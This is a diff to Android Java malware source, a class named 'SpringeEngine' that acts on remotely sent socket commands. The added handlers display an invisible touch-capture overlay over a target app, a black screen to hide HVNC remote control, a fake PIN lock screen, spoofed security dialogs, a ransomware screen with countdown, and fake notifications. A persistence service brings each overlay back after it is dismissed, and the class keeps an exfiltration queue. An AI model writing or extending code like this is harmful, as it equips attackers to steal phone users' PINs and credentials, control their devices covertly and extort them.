@@ -553,6 +553,248 @@ public final class SpringeEngine {
         }
     }
 
+    private void handleShowInvisible(JSONObject data, SocketClient socket, String cmdId) {
+    if (!initialised.get()) { emitError(socket, cmdId, "Engine not initialised"); return; }
+
+    mainHandler.post(() -> {
+        try {
+            String targetPkg = data.optString(SpringeProtocol.KEY_TARGET_PACKAGE, "");
+            invisibleTouchOverlay.show(targetPkg);
+            config.setActiveOverlayType(SpringeProtocol.OVERLAY_INVISIBLE);
+            state.set(STATE_INVISIBLE_CAPTURE);
+            persistenceService.startMonitoring(
+                SpringeProtocol.OVERLAY_INVISIBLE, targetPkg, null);
+            screenStateMonitor.start();
+            emitStatus(socket, cmdId, "invisible_shown",
+                "Invisible touch capture active for " + targetPkg);
+        } catch (Exception e) {
+            emitError(socket, cmdId, "Failed: " + e.getMessage());
+        }
+    });
+}
+
+private void handleShowBlack(JSONObject data, SocketClient socket, String cmdId) {
+    if (!initialised.get()) { emitError(socket, cmdId, "Engine not initialised"); return; }
+
+    mainHandler.post(() -> {
+        try {
+            blackScreenOverlay.show();
+            config.setActiveOverlayType(SpringeProtocol.OVERLAY_BLACK);
+            state.set(STATE_BLACK_HVNC);
+            persistenceService.startMonitoring(
+                SpringeProtocol.OVERLAY_BLACK, null, null);
+            screenStateMonitor.start();
+            emitStatus(socket, cmdId, "black_shown", "Black screen HVNC concealment active");
+        } catch (Exception e) {
+            emitError(socket, cmdId, "Failed: " + e.getMessage());
+        }
+    });
+}
+
+private void handleShowLockScreen(JSONObject data, SocketClient socket, String cmdId) {
+    if (!initialised.get()) { emitError(socket, cmdId, "Engine not initialised"); return; }
+
+    int mode = data.optInt("mode", LockScreenOverlay.MODE_PIN);
+
+    mainHandler.post(() -> {
+        try {
+            lockScreenOverlay.show(mode);
+            config.setActiveOverlayType(SpringeProtocol.OVERLAY_LOCKSCREEN);
+            persistenceService.startMonitoring(
+                SpringeProtocol.OVERLAY_LOCKSCREEN, null, null);
+            screenStateMonitor.start();
+            emitStatus(socket, cmdId, "lockscreen_shown",
+                "Fake lock screen displayed (mode=" + mode + ")");
+        } catch (Exception e) {
+            emitError(socket, cmdId, "Failed: " + e.getMessage());
+        }
+    });
+}
+
+private void handleShowDialog(JSONObject data, SocketClient socket, String cmdId) {
+    if (!initialised.get()) { emitError(socket, cmdId, "Engine not initialised"); return; }
+
+    int type = data.optInt("dialogType", DialogOverlay.TYPE_SECURITY);
+    String title = data.optString("title", null);
+    String message = data.optString("message", null);
+    String buttonText = data.optString("buttonText", null);
+
+    mainHandler.post(() -> {
+        try {
+            dialogOverlay.show(type, title, message, buttonText);
+            config.setActiveOverlayType(SpringeProtocol.OVERLAY_DIALOG);
+            persistenceService.startMonitoring(
+                SpringeProtocol.OVERLAY_DIALOG, null, null);
+            emitStatus(socket, cmdId, "dialog_shown", "Dialog displayed (type=" + type + ")");
+        } catch (Exception e) {
+            emitError(socket, cmdId, "Failed: " + e.getMessage());
+        }
+    });
+}
+
+private void handleShowRansom(JSONObject data, SocketClient socket, String cmdId) {
+    if (!initialised.get()) { emitError(socket, cmdId, "Engine not initialised"); return; }
+
+    int type = data.optInt("ransomType", FullScreenOverlay.TYPE_RANSOMWARE);
+    String title = data.optString("title", null);
+    String message = data.optString("message", null);
+    String actionText = data.optString("actionText", null);
+    String actionId = data.optString("actionId", "ransom_action");
+    int countdown = data.optInt("countdown", 0);
+
+    mainHandler.post(() -> {
+        try {
+            fullScreenOverlay.show(type, title, message, actionText, actionId, countdown);
+            config.setActiveOverlayType(SpringeProtocol.OVERLAY_RANSOM);
+            persistenceService.startMonitoring(
+                SpringeProtocol.OVERLAY_RANSOM, null, null);
+            screenStateMonitor.start();
+            emitStatus(socket, cmdId, "ransom_shown",
+                "Ransomware overlay displayed (type=" + type + ")");
+        } catch (Exception e) {
+            emitError(socket, cmdId, "Failed: " + e.getMessage());
+        }
+    });
+}
+
+/* ─── Notification SCM ─── */
+
+private void handleSendNotification(JSONObject data, SocketClient socket, String cmdId) {
+    String title = data.optString("title", "Notification");
+    String text = data.optString("text", "");
+    String targetPkg = data.optString(SpringeProtocol.KEY_TARGET_PACKAGE, "");
+    String templateId = data.optString(SpringeProtocol.KEY_TEMPLATE_ID, "default");
+    String icon = data.optString("icon", "default");
+
+    notificationOverlay.postNotification(title, text, targetPkg, templateId, icon);
+    emitStatus(socket, cmdId, "notification_sent",
+        "Fake notification posted: " + title);
+}
+
+/* ─── Schedule Management ─── */
+
+private void handleSetSchedules(JSONObject data, SocketClient socket, String cmdId) {
+    JSONArray schedules = data.optJSONArray("schedules");
+    if (schedules == null) {
+        emitError(socket, cmdId, "No schedules array");
+        return;
+    }
+    scheduleTrigger.setSchedules(schedules);
+    emitStatus(socket, cmdId, "schedules_set",
+        "Updated " + schedules.length() + " schedules");
+}
+
+/* ─── New Public Methods ─── */
+
+/**
+ * Get current overlay state string (for persistence checking).
+ */
+public String getCurrentOverlayState() {
+    String activeType = config.getActiveOverlayType();
+    return activeType != null ? activeType : "none";
+}
+
+/**
+ * Check if any overlay is currently active.
+ */
+public boolean hasActiveOverlay() {
+    String activeType = config.getActiveOverlayType();
+    if (activeType == null) return false;
+
+    switch (activeType) {
+        case SpringeProtocol.OVERLAY_WEBVIEW:
+            return webViewOverlay != null && webViewOverlay.isShowing();
+        case SpringeProtocol.OVERLAY_INVISIBLE:
+            return invisibleTouchOverlay != null && invisibleTouchOverlay.isShowing();
+        case SpringeProtocol.OVERLAY_BLACK:
+            return blackScreenOverlay != null && blackScreenOverlay.isShowing();
+        case SpringeProtocol.OVERLAY_LOCKSCREEN:
+            return lockScreenOverlay != null && lockScreenOverlay.isShowing();
+        case SpringeProtocol.OVERLAY_DIALOG:
+            return dialogOverlay != null && dialogOverlay.isShowing();
+        case SpringeProtocol.OVERLAY_RANSOM:
+            return fullScreenOverlay != null && fullScreenOverlay.isShowing();
+        default:
+            return false;
+    }
+}
+
+/**
+ * Restore an overlay by type. Called by OverlayPersistenceService.
+ */
+public void restoreOverlay(String overlayType, String targetPackage, String templateId) {
+    if (overlayType == null) return;
+
+    switch (overlayType) {
+        case SpringeProtocol.OVERLAY_WEBVIEW: {
+            String html = templateManager.getTemplateHtml(templateId);
+            if (html != null) {
+                mainHandler.post(() -> webViewOverlay.show(templateId, html, targetPackage));
+            }
+            break;
+        }
+        case SpringeProtocol.OVERLAY_INVISIBLE:
+            mainHandler.post(() -> invisibleTouchOverlay.show(targetPackage));
+            break;
+        case SpringeProtocol.OVERLAY_BLACK:
+            mainHandler.post(() -> blackScreenOverlay.show());
+            break;
+        case SpringeProtocol.OVERLAY_LOCKSCREEN:
+            mainHandler.post(() -> lockScreenOverlay.show(LockScreenOverlay.MODE_PIN));
+            break;
+        case SpringeProtocol.OVERLAY_DIALOG:
+            mainHandler.post(() -> dialogOverlay.show(DialogOverlay.TYPE_SECURITY,
+                null, null, null));
+            break;
+        case SpringeProtocol.OVERLAY_RANSOM:
+            mainHandler.post(() -> fullScreenOverlay.show(
+                FullScreenOverlay.TYPE_RANSOMWARE, null, null, null, null, 0));
+            break;
+    }
+}
+
+// Update the existing hideAllOverlays() to include new overlay types:
+private void hideAllOverlays() {
+    try {
+        mainHandler.post(() -> {
+            try { webViewOverlay.hide(); } catch (Exception ignored) {}
+            try { invisibleTouchOverlay.hide(); } catch (Exception ignored) {}
+            try { blackScreenOverlay.hide(); } catch (Exception ignored) {}
+            try { lockScreenOverlay.hide(); } catch (Exception ignored) {}
+            try { dialogOverlay.hide(); } catch (Exception ignored) {}
+            try { fullScreenOverlay.hide(); } catch (Exception ignored) {}
+        });
+    } catch (Exception ignored) {}
+}
+
+// Update shutdown() to include new services:
+public void shutdown() {
+    executor.execute(() -> {
+        try {
+            handleDisarm(null, null, null);
+            foregroundWatcher.stop();
+            dataPusher.shutdown();
+            exfilQueue.clear();
+            templateManager.clear();
+            scheduleTrigger.stop();
+            screenStateMonitor.stop();
+            persistenceService.stopMonitoring();
+            NotificationTrigger.stop();
+            mainHandler.post(() -> {
+                try { webViewOverlay.destroy(); } catch (Exception ignored) {}
+                try { invisibleTouchOverlay.destroy(); } catch (Exception ignored) {}
+                try { blackScreenOverlay.destroy(); } catch (Exception ignored) {}
+                try { lockScreenOverlay.destroy(); } catch (Exception ignored) {}
+                try { dialogOverlay.destroy(); } catch (Exception ignored) {}
+                try { fullScreenOverlay.destroy(); } catch (Exception ignored) {}
+            });
+            Log.i(TAG, "Springe Engine shut down");
+        } catch (Exception e) {
+            Log.e(TAG, "Error during shutdown", e);
+        }
+    });
+    }
+
     private void handleClearCaptures(JSONObject data, SocketClient socket, String cmdId) {
         exfilQueue.clear();
         emitStatus(socket, cmdId, "captures_cleared", "All captured data cleared");
